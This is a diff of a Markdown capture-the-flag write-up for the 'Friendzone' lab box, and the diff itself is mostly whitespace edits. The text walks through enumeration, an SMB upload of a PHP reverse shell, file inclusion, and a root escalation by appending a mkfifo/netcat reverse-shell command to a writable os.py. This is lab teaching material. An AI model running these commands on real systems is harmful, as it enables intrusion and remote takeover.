@@ -20,6 +20,7 @@ Friendzone is an Ubuntu box running Apache that hosts numerous websites. The enu
 * OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
 
 **Port Scan**
+
 ```
 nmap -vv -Pn -sT -A -p- -oN /mnt/data/boxes/friendzone/_full_tcp_nmap.txt
 ```
@@ -32,13 +33,14 @@ nmap -vv -Pn -sT -A -p- -oN /mnt/data/boxes/friendzone/_full_tcp_nmap.txt
 * 443/tcp - https
 * 445/tcp - netbios
 
-
 **Directory/File Brute Force**
 
 ***10.10.10.123 / IP***
+
 ```
 gobuster dir -u http://10.10.10.123 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html,txt -t 15
 ```
+
 * /index.html - have you ever been friendzoned? (main site)
 * /wordpress - empty directory listing
 * /robots.txt - "seriously !?"
@@ -48,7 +50,7 @@ gobuster dir -k -u https://10.10.10.123 -w /usr/share/wordlists/dirbuster/direct
 ```
 
 _\- no results_
-  
+
 ***friendzone.red***
 
 ```
@@ -65,7 +67,6 @@ gobuster dir -k -u https://friendzone.red -w /usr/share/wordlists/dirbuster/dire
 
 _\- http - same as main site_
 
-
 ***administrator1.friendzone.red***
 
 ```
@@ -77,7 +78,6 @@ gobuster dir -k -u https://administrator1.friendzone.red -w /usr/share/wordlists
 * /login.php
 * /dashboard.php
 * /timestamp.php
-
 
 _\- http - same as main site_
 
@@ -94,9 +94,11 @@ gobuster dir -k -u https://uploads.friendzone.red -w /usr/share/wordlists/dirbus
 ```
 
 * /index.html - Upload form
-* /files - blank page
-* /upload.php - Text: "WHAT ARE YOU TRYING TO DO HOOOOOOMAN !"
 
+* /files - blank page
+
+* /upload.php - Text: "WHAT ARE YOU TRYING TO DO HOOOOOOMAN !"
+  
   _\- http - same as main site_
 
 ***vpn.friendzoneportal.red***
@@ -112,7 +114,7 @@ gobuster dir -k -u https://friendzoneportal.red -w /usr/share/wordlists/dirbuste
 ```
 
 * /index.html - animated gif of Michael Jackson. Comment "Good"
-
+  
   _\- http - same as main site_
 
 ***admin.friendzoneportal.red***
@@ -123,7 +125,6 @@ gobuster dir -k -u https://admin.friendzoneportal.red -w /usr/share/wordlists/di
 
 * /index.html - username and password form
 * /login.php - Text: "ZZzzZzZ"
-
 
 _\- http, redirects to main site_
 
@@ -138,6 +139,7 @@ _\- http, redirects to main site_
 ```
 dig axfr friendzone.red @10.10.10.123
 ```
+
 * friendzone.red
 * administrator1.friendzone.red
 * hr.friendzone.red
@@ -178,7 +180,6 @@ smbmap -H 10.10.10.123
         general                                                 READ ONLY       FriendZone Samba Server Files
         Development                                             READ, WRITE     FriendZone Samba Server Files
         IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
-
 ```
 
 ## Steps (user)
@@ -204,7 +205,6 @@ Since I know the server is listening on port 53 and I now know a couple domains,
 10.10.10.123    files.friendzoneportal.red
 10.10.10.123    imports.friendzoneportal.red
 10.10.10.123    vpn.friendzoneportal.red
-
 ```
 
 I then kicked off gobuster scans, scanning http and https for all sub-domains. Due to the number of results I decided to let the scans finish and then go through each and take notes first before really diving into anything.
@@ -284,6 +284,7 @@ put rshell.php
 ```
 
 I started a netcat listener on port 4200
+
 ```
 netcat -lvnp 4200
 ```
@@ -297,7 +298,6 @@ https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../.
 Once the reverse shell was accessed at /etc/Development via the pagename parameter, I was in. 
 
 ![image](assets/81484692-b5c86880-9215-11ea-830d-75cf877d1d44.png)
-
 
 ## Steps (root/system)
 
@@ -314,6 +314,7 @@ I did some additional enumeration with a utility called LinEnum.
 > [LinEnum](https://github.com/rebootuser/LinEnum) automates linux enumeration by checking system information, processes, suid/guid binaries, folder/file permissions, and many other things.
 
 I copied LinEnum to my working directory and started a python http server
+
 ```
 cp ~/tools/LinEnum/LinEnum.sh le.sh
 python3 -m http.server 80
@@ -327,6 +328,7 @@ wget http://10.10.14.22/le.sh
 chmod +x
 ./le.sh -t
 ```
+
 I came across a couple interesting things. The first was a python script that was being run by root
 
 ![image](assets/81485198-45bbe180-9219-11ea-8bea-5a108c5ddd43.png)
@@ -353,7 +355,6 @@ print "[+] Trying to send email to %s"%to_address
 
 # I need to edit the script later
 # Sam ~ python developer
-
 ```
 
 Since I have write access to this file, I added the following line to the end of os.py to execute an os command to create a reverse shell to my machine.
@@ -363,6 +364,7 @@ vi /usr/lib/python2.7/os.py
 import os
 os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.22 4200 >/tmp/f")
 ```
+
 When the root account ran reporter.py it imported os.py and executed the command to create a reverse shell and as a result called back to my machine to give me a shell as root.
 
 ![image](assets/81485617-4f931400-921c-11ea-940f-2497cf9d6b44.png)
